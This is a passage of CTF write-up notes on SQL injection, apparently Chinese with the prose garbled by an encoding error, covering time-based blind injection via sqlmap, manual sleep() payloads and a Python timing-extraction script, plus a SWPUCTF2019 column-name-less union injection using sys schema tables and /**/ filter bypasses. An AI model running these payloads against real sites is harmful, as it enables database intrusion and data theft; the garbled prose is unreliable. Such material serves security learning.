        #å¦‚æœæ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œflagé•¿åº¦+1æ¥ç€å¾ªç¯
        j = j + 1
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439880.png" alt="image-20210719170950999" style="zoom:80%;" />



### æ—¶é—´ç›²æ³¨

- sqlmapå·¥å…·æ³•ï¼š 

1. çˆ†åº“å=ã€‹å‘ç°4ä¸ªåº“å

```
sqlmap -u http://challenge-53394f4a591385b3.sandbox.ctfhub.com:10800/?id=1 --dbs
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439881.png" alt="image-20210719173257617" style="zoom:80%;" />

2. çˆ†è¡¨å

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables
```

![image-20210719223141434](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439882.png)

3. çˆ†åˆ—å

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439883.png" alt="image-20210719223210839" style="zoom:67%;" />

4. çˆ†æ•°æ®

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
```

![image-20210719224102387](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439884.png)



- æ‰‹æ³¨æ³•

```sql
åˆ¤æ–­å½“å‰æ•°æ®åº“åé•¿ï¼Œå‘ç°é•¿åº¦ä¸º4
?id=1 and if(length(database())=4,1,sleep(3))
åˆ¤æ–­å½“å‰åº“ä¸‹è¡¨ä¸ªæ•°ï¼Œä¸º2æ—¶åœä¸‰ç§’,è¯´æ˜æœ‰ä¸¤å¼ è¡¨
?id=1 and if((select count(table_name) from information_schema.tables
 where table_schema=database())=2,sleep(3),1)
 
```



- pythonè‡ªåŠ¨è„šæœ¬

```python
# -*- coding:utf-8 -*-
import requests
import time
flag = ""
for i in range(1,50):
    min=32
    max=127
    mid=(min+max)//2
    while min<max:
        starttime = time.time()
        #pa = '1^if(ascii(substr(database(),{},1))>{},sleep(2),-1)^1'.format(str(i),str(mid)) çˆ†åº“
        #pa = "1^if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='sqli'),{},1))>{},sleep(2),-1)^1".format(str(i),str(mid)) çˆ†è¡¨
        #pa = "1^if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{},1))>{},sleep(2),-1)^1".format(str(i), str(mid)) çˆ†åˆ—
        pa = "1^if(ascii(substr((select group_concat(flag) from flag),{},1))>{},sleep(2),-1)^1".format(str(i), str(mid))
        url = "http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id="
        ur=url+pa
        res = requests.get(ur)
        if time.time() - starttime > 2:
            min=mid+1
        else:
            max=mid
        mid = (min + max)//2
    flag+=chr(mid)
    print(flag)
    #å¾—åˆ°flag
```





## æ— åˆ—åæ³¨å…¥ä¾‹å­

### SWPUCTF2019

å‚è€ƒï¼š[ä¸ªäººåšå®¢1çŸ¥è¯†ç‚¹åŠwp](http://www.pdsdt.lovepdsdt.com/index.php/2019/12/12/mysql/)ã€[ä¸ªäººåšå®¢2ï¼Œwpæ›´è¯¦ç»†](https://www.cnblogs.com/wangtanzhi/p/12241499.html) ã€ [information_schemaå¤–çš„æ€è€ƒ](https://www.anquanke.com/post/id/193512)

==è¦ç‚¹: information_schemaè¢«è¿‡æ»¤ï¼Œæ— åˆ—åæ³¨å…¥==

#### çŸ¥è¯†ç‚¹ï¼š

1. **ç©ºæ ¼å’Œorè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨æ³¨é‡Šç¬¦å·æ¥ä»£æ›¿ç©ºæ ¼**`/**/`

2. orè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨order byåŠinformation_schemaè¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨sysæ•°æ®åº“è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œ**ä½¿ç”¨sysæ•°æ®åº“éœ€è¦æ»¡è¶³ï¼š**

>     1.æ•°æ®åº“ç‰ˆæœ¬å¤§äºç­‰äº5.7  //version()
>     2.æ•°æ®åº“ç”¨æˆ·ä¸ºroot@localohostç”¨æˆ·  //user()  ã€ç®¡ç†å‘˜èº«ä»½ã€‘

3. ==ï¼ï¼==information_schemaå¤–ï¼Œä»¥ä¸‹éƒ½å¯ä»¥æŸ¥è¯¢è¡¨åä¿¡æ¯ã€**ä½†æŸ¥è¯¢ä¸åˆ°åˆ—åï¼ŒæŸ¥è¯¢åˆ—åè¦ç”¨æ— åˆ—åæ³¨å…¥**ã€‘ [å‚è€ƒ1](http://www.tristan.top/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/)

   ```
   sys.schema_auto_increment_columns  //æœ‰è‡ªå¢id
   sys.schema_table_statistics_with_buffer //æ— è‡ªå¢id
   mysql.innodb_table_stats  //ä¸€èˆ¬å…³é—­
   
   
   //è·å–å½“å‰åº“é‡Œçš„è¡¨å
   ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+
   ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
   ```

   

<img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212640240-1882833743.png" alt="innodb" style="zoom:67%;" />



![2](https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212521529-1650453614.png)





æŸ¥è¯¢è¡¨åï¼š

```mysql
//ç”¨sys.schema_auto_increment_columns
11'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'

//æˆ–è€…mysql.innodb_table_stats
id=-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'1
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439885.png" alt="image-20210522145658218" style="zoom:67%;" />



æŸ¥è¯¢åˆ—åï¼Œå‘ç°ä¸è¡Œï¼Œç”¨==æ— åˆ—åæ³¨å…¥==ï¼š**ç¬¬ä¸€åˆ—åº”è¯¥ä¸ºidæ‰€ä»¥ä»ç¬¬äºŒåˆ—æ‰¾ï¼Œç¬¬äºŒåˆ—å¯èƒ½ä¸ºnameï¼Œç¬¬ä¸‰åˆ—ä¸ºpassword**

```mysql
é‡ç‚¹ï¼šè·å–ç¬¬äºŒåˆ—æ‰€æœ‰è¡Œçš„æ•°æ®ï¼š
(select group_concat(a) from (select 1,2 as a,3 union select*from users)c)  //ç¬¬äºŒåˆ—åˆ«åä¸ºaï¼Œç¬¬ä¸€åˆ—åº”è¯¥ä¸ºid

111'/**/union/**/select/**/1ï¼Œ(select/**/group_concat(a)/**/from/**/(select/**/1,2/**/as/**/a,3/**/union/**/select*from/**/users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439886.png" alt="image-20210522150318206" style="zoom:67%;" />



å¯ä»¥çœ‹åˆ°flagåœ¨ç¬¬äºŒä¸ªï¼Œæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹å¯¹åº”ç¬¬ä¸‰åˆ—çš„å€¼ï¼Œå³å¯æŸ¥è¯¢å‡ºflagï¼š

```mysql
é‡ç‚¹ï¼š(select group_concat(b) from (select 1,2,3 as b union select*from users)c) //æŸ¥è¯¢flagå¯¹åº”ç¬¬ä¸‰åˆ—çš„å€¼

111'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439887.png" alt="image-20210522150330829" style="zoom:67%;" />

